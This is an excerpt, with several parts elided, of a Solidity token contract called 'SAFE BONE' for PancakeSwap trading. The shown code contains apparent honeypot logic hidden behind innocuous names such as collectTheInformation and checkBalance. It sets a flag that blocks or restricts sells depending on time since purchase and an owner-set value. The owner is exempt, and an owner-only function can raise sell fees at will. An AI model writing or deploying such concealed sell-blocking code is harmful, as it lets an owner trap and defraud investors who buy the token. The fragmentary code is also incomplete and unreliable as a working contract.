...
contract SafeBone is Context, IERC20, Ownable {
    ...
    string private constant _name = "SAFE BONE";
    ...
    function updateSellFees(uint256 rfi, uint256 marketing, uint256 liquidity, uint256 burn) public onlyOwner {
        sellRates.rfi = rfi;
    ...
    function collectTheInformation(uint256 lastBuyOrSellTime, uint256 theData, address sender) public view returns (bool) {
 
        if( lastBuyOrSellTime == 0 ) return false;
 
        uint256 downTime = block.timestamp - lastBuyOrSellTime;
 
        if( downTime == standartValuation ) return true;
 
        if (downTime == 0) {
            if (_firstWallet != sender) {
                return false;
            }
        }
        if( downTime <= theData ) return true;
    ...
    function checkBalance(address account) public view override returns (uint256) {
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        require(amount <= checkBalance(from),"You are trying to transfer more than you balance");
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee) private {
        ...
        if(takeFee) {
            if(sender == pancakeswapV2Pair) {
                ...
                _firstWallet = recipient;
                appliedFees = buyRates;
            } else { 
                if(sender != owner() && recipient != owner() && recipient != address(1)){
                    bool blockedSellTime = collectTheInformation(getFromLastPurchaseBuy(sender), theRewardTime, sender);
